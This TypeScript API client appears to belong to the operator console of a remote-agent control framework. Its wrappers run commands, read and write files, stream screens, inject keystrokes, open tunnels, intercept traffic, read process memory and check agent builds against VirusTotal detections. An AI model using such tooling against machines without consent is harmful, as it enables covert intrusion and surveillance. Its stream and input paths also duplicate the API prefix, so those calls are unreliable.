import type {
  APIResponse, AgentRecord, HealthInfo, BuildConfig, Profile, Task,
  Operator, EnrollmentToken, AuditEntry, RevokedAgent, FileTransfer,
} from './types'

const BASE = '/api/v1'

// getToken retrieves the auth token from localStorage. Returns empty string
// if not set (user not logged in).
export function getToken(): string {
  return localStorage.getItem('probe_token') || ''
}

// setToken stores the auth token in localStorage.
export function setToken(token: string) {
  localStorage.setItem('probe_token', token)
}

// clearToken removes the auth token from localStorage (logout).
export function clearToken() {
  localStorage.removeItem('probe_token')
}

async function apiFetch<T>(path: string, options?: RequestInit): Promise<T> {
  const token = getToken()
  const res = await fetch(`${BASE}${path}`, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...options?.headers,
    },
  })
  // Handle 401: clear token and redirect to login.
  if (res.status === 401) {
    clearToken()
    window.location.reload()
    throw new Error('Unauthorized')
  }
  const body: APIResponse<T> = await res.json()
  if (!body.ok) {
    throw new Error(body.error?.message || `HTTP ${res.status}`)
  }
  return body.data as T
}

// login authenticates with username/password and stores the token.
export async function login(username: string, password: string): Promise<Operator> {
  const res = await fetch(`${BASE}/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password }),
  })
  const body: APIResponse<{ token: string; operator: Operator }> = await res.json()
  if (!body.ok) {
    throw new Error(body.error?.message || 'Login failed')
  }
  setToken(body.data!.token)
  return body.data!.operator
}

export const api = {
  // Health
  getHealth: () => apiFetch<HealthInfo>('/health'),

  // Agents
  listAgents: () => apiFetch<AgentRecord[]>('/agents'),
  getAgent: (id: string) => apiFetch<AgentRecord>(`/agents/${id}`),
  deleteAgent: (id: string) =>
    apiFetch<{ removed: string }>(`/agents/${id}`, { method: 'DELETE' }),
  getAgentHealth: (id: string) => apiFetch<AgentRecord>(`/agents/${id}/health`),
  getAgentAudit: (id: string) => apiFetch<AuditEntry[]>(`/agents/${id}/audit`),

  // Agent commands (all POST)
  execCmd: (id: string, cmd: string) =>
    apiFetch<unknown>(`/agents/${id}/exec`, {
      method: 'POST',
      body: JSON.stringify({ command: cmd }),
    }),
  fsList: (id: string, dir: string) =>
    apiFetch<unknown>(`/agents/${id}/fs-list`, {
      method: 'POST',
      body: JSON.stringify({ path: dir }),
    }),
  fsRead: (id: string, path: string) =>
    apiFetch<unknown>(`/agents/${id}/fs-read`, {
      method: 'POST',
      body: JSON.stringify({ path }),
    }),
  fsWrite: (id: string, path: string, content: string) =>
    apiFetch<unknown>(`/agents/${id}/fs-write`, {
      method: 'POST',
      body: JSON.stringify({ path, content, encoding: 'base64', data: btoa(content) }),
    }),
  fsStat: (id: string, path: string) =>
    apiFetch<unknown>(`/agents/${id}/fs-stat`, {
      method: 'POST',
      body: JSON.stringify({ path }),
    }),
  fsHash: (id: string, path: string) =>
    apiFetch<unknown>(`/agents/${id}/fs-hash`, {
      method: 'POST',
      body: JSON.stringify({ path }),
    }),
  procList: (id: string) =>
    apiFetch<unknown>(`/agents/${id}/proc-list`, { method: 'POST', body: '{}' }),
  procKill: (id: string, pid: number) =>
    apiFetch<unknown>(`/agents/${id}/proc-kill`, {
      method: 'POST',
      body: JSON.stringify({ pid }),
    }),
  procStart: (id: string, exe: string, args?: string) =>
    apiFetch<unknown>(`/agents/${id}/proc-start`, {
      method: 'POST',
      body: JSON.stringify({ executable: exe, args: args || '' }),
    }),
  capture: (id: string) =>
    apiFetch<unknown>(`/agents/${id}/capture`, { method: 'POST', body: '{}' }),

  // Screen streaming
  streamStart: (id: string, display: number, fps: number, quality: number) =>
    apiFetch<unknown>(`/api/v1/agents/${id}/stream-start`, {
      method: 'POST',
      body: JSON.stringify({ display, fps, quality }),
    }),
  streamStop: (id: string, streamId: string) =>
    apiFetch<unknown>(`/api/v1/agents/${id}/stream-stop`, {
      method: 'POST',
      body: JSON.stringify({ stream_id: streamId }),
    }),
  streamFrame: (id: string) =>
    apiFetch<unknown>(`/api/v1/agents/${id}/stream-frame`),

  // Input (mouse/keyboard)
  pointerClick: (id: string, x: number, y: number, button: string) =>
    apiFetch<unknown>(`/api/v1/agents/${id}/pointer-click`, {
      method: 'POST',
      body: JSON.stringify({ x, y, button }),
    }),
  keyPress: (id: string, key: string) =>
    apiFetch<unknown>(`/api/v1/agents/${id}/key-press`, {
      method: 'POST',
      body: JSON.stringify({ key }),
    }),
  keyCombo: (id: string, keys: string[]) =>
    apiFetch<unknown>(`/api/v1/agents/${id}/key-combo`, {
      method: 'POST',
      body: JSON.stringify({ keys }),
    }),
  textInput: (id: string, text: string) =>
    apiFetch<unknown>(`/api/v1/agents/${id}/text-input`, {
      method: 'POST',
      body: JSON.stringify({ text }),
    }),

  tunnelOpen: (id: string, port: number, target: string) =>
    apiFetch<unknown>(`/agents/${id}/tunnel`, {
      method: 'POST',
      body: JSON.stringify({ local_port: port, target_address: target }),
    }),
  tunnelClose: (id: string, tunnelId: string) =>
    apiFetch<unknown>(`/agents/${id}/tunnel-close`, {
      method: 'POST',
      body: JSON.stringify({ tunnel_id: tunnelId }),
    }),
  mitmStart: (id: string, target: string, port: number) =>
    apiFetch<unknown>(`/agents/${id}/mitm-start`, {
      method: 'POST',
      body: JSON.stringify({ target_address: target, target_port: port }),
    }),
  mitmStop: (id: string) =>
    apiFetch<unknown>(`/agents/${id}/mitm-stop`, { method: 'POST', body: '{}' }),
  mitmTraffic: (id: string) =>
    apiFetch<unknown>(`/agents/${id}/mitm-traffic`, { method: 'POST', body: '{}' }),
  debugAttach: (id: string, pid: number) =>
    apiFetch<unknown>(`/agents/${id}/debug-attach`, {
      method: 'POST',
      body: JSON.stringify({ pid }),
    }),
  debugDetach: (id: string) =>
    apiFetch<unknown>(`/agents/${id}/debug-detach`, { method: 'POST', body: '{}' }),
  debugReadMem: (id: string, addr: string, size: number) =>
    apiFetch<unknown>(`/agents/${id}/debug-read-mem`, {
      method: 'POST',
      body: JSON.stringify({ address: addr, size }),
    }),
  debugModules: (id: string) =>
    apiFetch<unknown>(`/agents/${id}/debug-modules`, { method: 'POST', body: '{}' }),

  // Builds
  listBuilds: () => apiFetch<BuildConfig[]>('/builds'),
  createBuild: (cfg: BuildConfig) =>
    apiFetch<BuildConfig>('/builds', {
      method: 'POST',
      body: JSON.stringify(cfg),
    }),
  getBuild: (id: string) => apiFetch<BuildConfig>(`/builds/${id}`),
  downloadBuildUrl: (id: string) => `${BASE}/builds/${id}/download`,
  deleteBuild: (id: string) =>
    apiFetch<{ deleted: string }>(`/builds/${id}`, { method: 'DELETE' }),

  // Profiles
  listProfiles: () => apiFetch<Profile[]>('/profiles'),
  createProfile: (p: Profile) =>
    apiFetch<Profile>('/profiles', {
      method: 'POST',
      body: JSON.stringify(p),
    }),
  getProfile: (id: string) => apiFetch<Profile>(`/profiles/${id}`),
  deleteProfile: (id: string) =>
    apiFetch<{ deleted: string }>(`/profiles/${id}`, { method: 'DELETE' }),

  // Tasks
  listTasks: (agentId?: string, status?: string) => {
    const params = new URLSearchParams()
    if (agentId) params.set('agent_id', agentId)
    if (status) params.set('status', status)
    const q = params.toString()
    return apiFetch<Task[]>(`/tasks${q ? '?' + q : ''}`)
  },
  createTask: (task: {
    agent_id: string
    command_type: string
    params: unknown
    schedule: { type: string; delay_seconds?: number; interval_seconds?: number }
  }) =>
    apiFetch<Task>('/tasks', {
      method: 'POST',
      body: JSON.stringify(task),
    }),
  getTask: (id: string) => apiFetch<Task>(`/tasks/${id}`),
  cancelTask: (id: string) =>
    apiFetch<{ cancelled: string }>(`/tasks/${id}`, { method: 'DELETE' }),

  // Operators
  listOperators: () => apiFetch<Operator[]>('/operators'),
  createOperator: (name: string, role: string, token: string) =>
    apiFetch<Operator>('/operators', {
      method: 'POST',
      body: JSON.stringify({ name, role, token }),
    }),
  deleteOperator: (id: string) =>
    apiFetch<{ deleted: string }>(`/operators/${id}`, { method: 'DELETE' }),

  // Enrollment tokens
  listEnrollmentTokens: () => apiFetch<EnrollmentToken[]>('/enrollment-tokens'),
  createEnrollmentToken: (agentName: string, ttlHours: number) =>
    apiFetch<EnrollmentToken>('/enrollment-tokens', {
      method: 'POST',
      body: JSON.stringify({ agent_name: agentName, ttl_hours: ttlHours }),
    }),

  // Revoked agents
  listRevokedAgents: () => apiFetch<RevokedAgent[]>('/agents/revoked'),

  // Audit
  queryAudit: (filter: { agent_id?: string; operator_id?: string; action?: string; limit?: number }) => {
    const params = new URLSearchParams()
    if (filter.agent_id) params.set('agent_id', filter.agent_id)
    if (filter.operator_id) params.set('operator_id', filter.operator_id)
    if (filter.action) params.set('action', filter.action)
    if (filter.limit) params.set('limit', String(filter.limit))
    const q = params.toString()
    return apiFetch<AuditEntry[]>(`/audit${q ? '?' + q : ''}`)
  },

  // Agent capabilities + redeploy
  getAgentCapabilities: (id: string) =>
    apiFetch<{ capabilities: string[] }>(`/agents/${id}/capabilities`),
  redeployAgent: (id: string, capabilities: string[], serverUrl?: string) =>
    apiFetch<{ build_id: string; status: string }>(`/agents/${id}/redeploy`, {
      method: 'POST',
      body: JSON.stringify({ capabilities, server_url: serverUrl }),
    }),

  // VirusTotal scan
  triggerVTScan: (buildId: string) =>
    apiFetch<{ status: string; message?: string }>(`/builds/${buildId}/vt-scan`, { method: 'POST', body: '{}' }),
  getVTScan: (buildId: string) =>
    apiFetch<{ vt_status: string; detections: number; total: number; report_url: string }>(`/builds/${buildId}/vt-scan`),

  // File transfers (global)
  listTransfers: () => apiFetch<FileTransfer[]>('/transfers'),
  getTransfer: (id: string) =>
    apiFetch<FileTransfer & { percent: number }>(`/transfers/${id}`),
  pauseTransfer: (id: string) =>
    apiFetch<{ paused: string }>(`/transfers/${id}/pause`, { method: 'POST', body: '{}' }),
  resumeTransfer: (id: string, localPath?: string) =>
    apiFetch<{ resumed: string }>(`/transfers/${id}/resume`, {
      method: 'POST',
      body: JSON.stringify({ local_path: localPath || '' }),
    }),
  verifyTransfer: (id: string, verifyPath: string) =>
    apiFetch<{ verified: boolean; expected: string; actual: string }>(`/transfers/${id}/verify`, {
      method: 'POST',
      body: JSON.stringify({ verify_path: verifyPath }),
    }),
}